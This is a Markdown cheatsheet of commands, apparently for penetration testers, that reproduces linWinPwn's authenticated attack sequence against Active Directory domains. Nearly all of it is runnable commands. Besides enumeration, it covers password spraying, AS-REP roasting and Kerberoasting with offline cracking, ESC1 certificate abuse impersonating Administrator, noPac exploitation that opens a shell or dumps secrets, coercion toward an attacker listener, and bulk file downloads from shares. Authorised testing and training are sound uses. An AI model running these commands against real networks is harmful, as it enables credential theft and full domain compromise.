# LinWinPwn Authenticated Auto Mode - Command Cheatsheet

> Manual command reference extracted from linWinPwn Auto mode execution order.

---

## Variables Reference

```bash
DC_IP="10.10.10.10"
DC_FQDN="dc01.domain.local"
DC_NETBIOS="DC01"
DOMAIN="domain.local"
USER="username"
PASS="password"
HASH="aad3b435b51404eeaad3b435b51404ee:ntlmhash"
DNS_IP="10.10.10.10"
TARGETS_FILE="targets.txt"
USERS_FILE="users.txt"
```

---

## 1. DNS Enumeration

### netexec - DNS Zone Dump
```bash
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M get-network -o ALL=true
```

---

## 2. Active Directory Enumeration

### BloodHound CE
```bash
# Full collection (noisy)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all,LoggedOn -ns $DNS_IP --dns-timeout 10 -dc $DC_FQDN

# DCOnly collection (quieter)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c DCOnly -ns $DNS_IP --dns-timeout 10 -dc $DC_FQDN

# With LDAP channel binding
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all,LoggedOn -ns $DNS_IP --ldap-channel-binding -dc $DC_FQDN
```

### ldapdomaindump
```bash
# LDAP
ldapdomaindump -u "$DOMAIN\\$USER" -p $PASS ldap://$DC_IP:389 -o ./LDAPDomainDump

# LDAPS
ldapdomaindump -u "$DOMAIN\\$USER" -p $PASS ldaps://$DC_IP:636 -o ./LDAPDomainDump
```

### enum4linux-ng
```bash
# With password
enum4linux-ng -A -w $DOMAIN -u $USER -p $PASS $DC_IP -oJ enum4linux_output

# With NTLM hash
enum4linux-ng -A -w $DOMAIN -u $USER -H $HASH $DC_IP -oJ enum4linux_output

# Verbose
enum4linux-ng -A -v -w $DOMAIN -u $USER -p $PASS $DC_IP -oJ enum4linux_output
```

### netexec - User Enumeration
```bash
# SMB users (authenticated)
netexec smb $DC_IP -u $USER -p $PASS --users-export users.txt

# LDAP users (authenticated)
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --users-export users.txt --kdcHost $DC_FQDN
```

### netexec - Password Policy
```bash
# SMB password policy
netexec smb $DC_IP -u $USER -p $PASS --pass-pol

# LDAP password policy
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --pass-pol --kdcHost $DC_FQDN
```

### netexec - DC & Domain Info
```bash
# DC list
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --dc-list --kdcHost $DC_FQDN

# Password not required users
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --password-not-required --kdcHost $DC_FQDN

# Users with "pass" in description
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M get-desc-users --kdcHost $DC_FQDN

# userPassword/unixUserPassword attributes
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M get-unixUserPassword -M get-userPassword --kdcHost $DC_FQDN

# Machine Account Quota
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M maq --kdcHost $DC_FQDN

# Subnets
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M subnets --kdcHost $DC_FQDN
```

### Delegation Enumeration
```bash
# impacket findDelegation
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -target-domain $DOMAIN -dc-host $DC_NETBIOS

# netexec delegation
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --find-delegation --kdcHost $DC_FQDN
netexec ldap --port 389 $DC_IP -u $USER -p $PASS --trusted-for-delegation --kdcHost $DC_FQDN
```

### bloodyAD
```bash
# Forest level
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get object "DC=domain,DC=local" --attr msDS-Behavior-Version

# Machine Account Quota
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get object "DC=domain,DC=local" --attr ms-DS-MachineAccountQuota

# Min password length
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get object "DC=domain,DC=local" --attr minPwdLength

# All users
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get children --otype useronly

# All computers
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get children --otype computer

# All containers
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get children --otype container

# Kerberoastable users
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName

# ASREProastable users
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName

# Writable objects (current user)
bloodyAD -u $USER -p $PASS --host $DC_FQDN --dc-ip $DC_IP get writable

# LDAPS (-s flag)
bloodyAD -u $USER -p $PASS -s --host $DC_FQDN --dc-ip $DC_IP get children --otype useronly
```

### windapsearch
```bash
# Users
windapsearch -d "$DOMAIN\\$USER" -p $PASS --dc $DC_IP --port 389 -m users --full

# Computers
windapsearch -d "$DOMAIN\\$USER" -p $PASS --dc $DC_IP --port 389 -m computers --full

# Groups
windapsearch -d "$DOMAIN\\$USER" -p $PASS --dc $DC_IP --port 389 -m groups --full

# Privileged users
windapsearch -d "$DOMAIN\\$USER" -p $PASS --dc $DC_IP --port 389 -m privileged-users --full

# SPNs (for MSSQL servers)
windapsearch -d "$DOMAIN\\$USER" -p $PASS --dc $DC_IP --port 389 -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName
```

---

## 3. ADCS Enumeration

### netexec ADCS
```bash
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M adcs --kdcHost $DC_FQDN
```

### certi.py
```bash
# List CAs
certi.py list -u "$USER@$DOMAIN" -p $PASS --dc-ip $DC_IP --class ca

# List CA services
certi.py list -u "$USER@$DOMAIN" -p $PASS --dc-ip $DC_IP --class service

# Find vulnerable templates
certi.py list -u "$USER@$DOMAIN" -p $PASS --dc-ip $DC_IP --vuln --enabled
```

### certipy
```bash
# Enumerate all
certipy find -u "$USER@$DOMAIN" -p $PASS -dc-ip $DC_IP -ns $DNS_IP -stdout

# Find vulnerable templates (ESC1-ESC16)
certipy find -u "$USER@$DOMAIN" -p $PASS -dc-ip $DC_IP -ns $DNS_IP -vulnerable -json -output vuln_output -stdout -hide-admins

# With NTLM hash
certipy find -u "$USER@$DOMAIN" -hashes $HASH -dc-ip $DC_IP -ns $DNS_IP -vulnerable -stdout

# Without LDAP signing (if required)
certipy find -u "$USER@$DOMAIN" -p $PASS -dc-ip $DC_IP -ns $DNS_IP -no-ldap-signing -stdout

# ESC1 exploitation
certipy req -u "$USER@$DOMAIN" -p $PASS -ca "CA-NAME" -target $PKI_SERVER -template VulnTemplate -upn "Administrator@$DOMAIN" -dc-ip $DC_IP -key-size 4096

# Authenticate with PFX
certipy auth -pfx admin.pfx -dc-ip $DC_IP
```

---

## 4. SCCM Enumeration

### netexec SCCM
```bash
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M sccm -o REC_RESOLVE=TRUE
```

### sccmhunter
```bash
# Find SCCM
sccmhunter find -u $USER -p $PASS -d $DOMAIN -dc-ip $DC_IP

# SMB enumeration
sccmhunter smb -u $USER -p $PASS -d $DOMAIN -dc-ip $DC_IP -save

# Show results
sccmhunter show -users
sccmhunter show -computers
sccmhunter show -groups
sccmhunter show -mps

# LDAPS
sccmhunter find -u $USER -p $PASS -d $DOMAIN -ldaps -dc-ip $DC_IP
```

---

## 5. GPO Enumeration

### netexec GPP
```bash
netexec smb $DC_IP -u $USER -p $PASS -M gpp_autologin -M gpp_password
```

### gpoParser
```bash
gpoParser remote -u $USER -p $PASS -d $DOMAIN -s $DC_FQDN -o output.out -c ./gpo_cache
```

---

## 6. Brute Force Attacks

### kerbrute - User=Pass Check
```bash
# Create wordlist (user:user format)
kerbrute bruteforce userpass_wordlist.txt -d $DOMAIN --dc $DC_IP -t 5

# Password spray
kerbrute passwordspray $USERS_FILE "Password123" -d $DOMAIN --dc $DC_IP -t 5
```

### netexec - User=Pass Check
```bash
netexec smb $DC_IP -u $USERS_FILE -p $USERS_FILE --no-bruteforce --continue-on-success
```

### netexec - Pre2K Computer Accounts
```bash
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M pre2k
```

### netexec - Timeroast
```bash
netexec smb $DC_IP -u $USER -p $PASS -M timeroast
```

---

## 7. Kerberos Attacks

### AS-REP Roasting
```bash
# With credentials (auto-find vulnerable users)
impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -dc-host $DC_NETBIOS -request

# With user list (no creds needed)
impacket-GetNPUsers $DOMAIN/ -usersfile $USERS_FILE -request -dc-ip $DC_IP -dc-host $DC_NETBIOS
```

### Kerberoasting
```bash
# List SPNs
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -dc-host $DC_NETBIOS -target-domain $DOMAIN

# Request TGS tickets
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -request -dc-ip $DC_IP -dc-host $DC_NETBIOS -target-domain $DOMAIN

# Blind Kerberoast (using ASREP user)
impacket-GetUserSPNs -no-preauth asrep_user -usersfile $USERS_FILE -dc-ip $DC_IP -dc-host $DC_NETBIOS $DOMAIN
```

### Hash Cracking
```bash
# AS-REP hashes
john asreproast_hashes.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
john asreproast_hashes.txt --format=krb5asrep --show

# Kerberoast hashes
john kerberoast_hashes.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
john kerberoast_hashes.txt --format=krb5tgs --show
```

### NoPac Check (CVE-2021-42278/42287)
```bash
netexec smb $DC_IP -u $USER -p $PASS -M nopac

# Exploitation (if vulnerable)
noPac.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -dc-host $DC_NETBIOS --impersonate Administrator -shell
noPac.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -dc-host $DC_NETBIOS --impersonate Administrator -dump
```

### MS14-068 Check
```bash
impacket-goldenPac "$DOMAIN/$USER:$PASS@$DC_FQDN" None -target-ip $DC_IP
```

---

## 8. Network Scans

### netexec Port Scans
```bash
# SMB (445)
netexec smb $TARGETS_FILE -u $USER -p $PASS

# WinRM (5985)
netexec winrm $TARGETS_FILE -u $USER -p $PASS

# SSH (22)
netexec ssh $TARGETS_FILE -u $USER -p $PASS

# MSSQL (1433)
netexec mssql $TARGETS_FILE -u $USER -p $PASS
```

---

## 9. Share Enumeration

### netexec Shares
```bash
# List shares
netexec smb $TARGETS_FILE -u $USER -p $PASS --shares

# Spider shares for files
netexec smb $TARGETS_FILE -u $USER -p $PASS -M spider_plus -o OUTPUT=./spider_output EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON
```

### smbmap
```bash
# List shares
smbmap -H $DC_IP -u $USER -p $PASS -d $DOMAIN

# Download interesting files
smbmap -H $DC_IP -u $USER -p $PASS -d $DOMAIN -A '\.xml|\.ini|\.txt|\.config|\.ps1' -r --exclude 'ADMIN$' 'C$' 'IPC$'
```

---

## 10. Vulnerability Checks

### Print Spooler / PrintNightmare
```bash
netexec smb $TARGETS_FILE -u $USER -p $PASS -M spooler
netexec smb $TARGETS_FILE -u $USER -p $PASS -M printnightmare
```

### WebDAV
```bash
netexec smb $TARGETS_FILE -u $USER -p $PASS -M webdav
```

### Coercion Vulnerabilities
```bash
# Check for coercion vulns
netexec smb $TARGETS_FILE -u $USER -p $PASS -M coerce_plus

# Coerce attack (with listener running)
netexec smb $TARGET -u $USER -p $PASS -M coerce_plus -o LISTENER=$ATTACKER_IP
```

### SMB Vulnerabilities
```bash
# NTLMv1
netexec smb $TARGETS_FILE -u $USER -p $PASS -M ntlmv1

# SMBGhost (CVE-2020-0796)
netexec smb $TARGETS_FILE -u $USER -p $PASS -M smbghost

# Remove-MIC
netexec smb $TARGETS_FILE -u $USER -p $PASS -M remove-mic

# SMB Signing disabled (relay list)
netexec smb $TARGETS_FILE -u $USER -p $PASS --gen-relay-list relay_targets.txt
```

### Coercer Scan
```bash
coercer scan -u $USER -p $PASS -d $DOMAIN -f $TARGETS_FILE --dc-ip $DC_IP --auth-type smb --export-xlsx coercer_results.xlsx
```

### BadSuccessor
```bash
# netexec check
netexec ldap --port 389 $DC_IP -u $USER -p $PASS -M badsuccessor

# impacket search
impacket-badsuccessor "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -dc-host $DC_NETBIOS -method LDAP -action search
```

### ZeroLogon
```bash
netexec smb $DC_IP -u $USER -p $PASS -M zerologon
```

### MS17-010
```bash
netexec smb $TARGETS_FILE -u $USER -p $PASS -M ms17-010
```

---

## 11. MSSQL Enumeration

### netexec MSSQL
```bash
# Privilege check
netexec mssql $SQL_TARGETS -u $USER -p $PASS -M mssql_priv

# Impersonation check
netexec mssql $SQL_TARGETS -u $USER -p $PASS -M enum_impersonate

# Login enumeration
netexec mssql $SQL_TARGETS -u $USER -p $PASS -M enum_logins

# Linked servers
netexec mssql $SQL_TARGETS -u $USER -p $PASS -M enum_links
```

### mssqlrelay
```bash
mssqlrelay checkall -u $USER -p $PASS -d $DOMAIN -ns $DNS_IP -windows-auth
```

### impacket mssqlclient
```bash
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$SQL_TARGET" -windows-auth
```

---

## Authentication Variants

### With NTLM Hash
```bash
# netexec
netexec smb $DC_IP -u $USER -H $HASH --shares

# impacket
impacket-GetUserSPNs "$DOMAIN/$USER" -hashes $HASH -dc-ip $DC_IP

# certipy
certipy find -u "$USER@$DOMAIN" -hashes $HASH -dc-ip $DC_IP

# bloodyAD
bloodyAD -u $USER -p ":$NTHASH" --host $DC_FQDN --dc-ip $DC_IP get children
```

### With Kerberos Ticket
```bash
# Set ticket
export KRB5CCNAME=/path/to/ticket.ccache

# netexec
netexec smb $DC_IP -u $USER -k --kdcHost $DC_FQDN --shares

# impacket
impacket-GetUserSPNs "$DOMAIN/$USER" -k -no-pass -dc-ip $DC_IP -dc-host $DC_NETBIOS
```

---

## Tags

#pentest #ActiveDirectory #cheatsheet #linWinPwn #netexec #impacket #certipy #bloodyAD
